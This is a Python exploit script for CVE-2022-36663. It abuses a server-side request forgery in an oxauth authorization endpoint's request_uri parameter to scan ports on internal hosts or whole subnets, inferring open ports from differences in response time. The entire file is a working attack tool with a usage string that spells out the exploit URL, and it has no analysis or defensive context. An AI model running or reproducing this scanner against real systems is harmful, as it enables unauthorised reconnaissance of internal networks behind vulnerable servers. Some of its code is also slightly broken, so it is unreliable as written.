#!/usr/bin/python3
import sys
import argparse
import re
import ipaddress
import requests
from pyfiglet import Figlet

def banner():
	banner = Figlet(font='future')
	print(banner.renderText('CVE-2022-36663'))
	
def output(ip,port,result):
	if result == 1:
		print('[+] Port ' + port + ' on host ' + ip + ' is open!\n')
	if result == 0:
		print('[+] Port ' + port + ' on host ' + ip + ' is closed.\n')

def scan(ip,url,port):
	MinResponse2 = 10000
	print('[+] Scanning ' + ip + ':' + port)
	for i in range(1,11):
		r = requests.get(url+authorzation_url+'http://'+ ip + ':' + port)
		if r.elapsed.total_seconds() < MinResponse2:
			MinResponse2 = r.elapsed.total_seconds()
	if abs(MinResponse2 - MinResponse) >= 0.025:
		output(ip,port,1)
	else:
		output(ip,port,0)
	

def main(args):
	global MinResponse
	MinResponse = 10000
	ip = args['ip']
	global authorzation_url
	authorzation_url = args['ar']
	url = args['url']
	port = args['port']
	pattern = re.compile("^([0-9]{1,3}\.){3}[0-9]{1,3}$")
	pattern2 = re.compile("^([0-9]{1,3}\.){3}[0-9]{1,3}\/[0-9]{1,2}$")
	#handle single IP
	if pattern.match(ip):
		print('[+] Calculating reference time for unreachable hosts...\n')
		for i in range(1,11):
			r = requests.get(url+authorzation_url+'http://localhost:11111') #checking response time for an unreachable port
			if r.elapsed.total_seconds() < MinResponse:
				MinResponse = r.elapsed.total_seconds()
		print("Response time for unreachable hosts: " + str(MinResponse) + '\n')
		scan(ip,url,port)
		
	#handle subnet
	elif pattern2.match(ip): 
		for i in range(1,11):
			r = requests.get(url+authorzation_url+'http://localhost:11111') #checking response time for an unreachable port
			if r.elapsed.total_seconds() < MinResponse:
				MinResponse = r.elapsed.total_seconds()
		subnet = ip
		ips = ipaddress.IPv4Network(subnet)
		for address in ips:
			scan(address,url,port)
			
	else:
		print("Malformed IP or Subnet - Example: 127.0.0.1 or 10.10.10.10/24")
		sys.exit()
	
	
        





if __name__ == "__main__":
	banner()
	parser = argparse.ArgumentParser(description="CVE-2022-36663 Internal Port Scanner via SSRF",usage="\npython3 CVE-2022-36663.py --url https://target --ip 10.10.10.10 --port 8080 --ar /oxauth/restv1/authorize?client_id=<clientID>&redirect_uri=https://target/return.html&response_type=code&scope=openid+profile+email+user_name&nonce=<nonce>&acr_values=simple_password_auth&request_uri=\n\n")
	parser.add_argument("-i", "--ip", help="Ip address to be scanned", required=True)
	parser.add_argument("-p", "--port", help="Port to be scanned", required=True)
	parser.add_argument("-u", "--url", help="Ip address to be scanned", required=True)
	parser.add_argument("-ar", "--ar", help="Aurhotization request URL ending with redirect_uri=", required=True)
	args = parser.parse_args()
	main(vars(args))
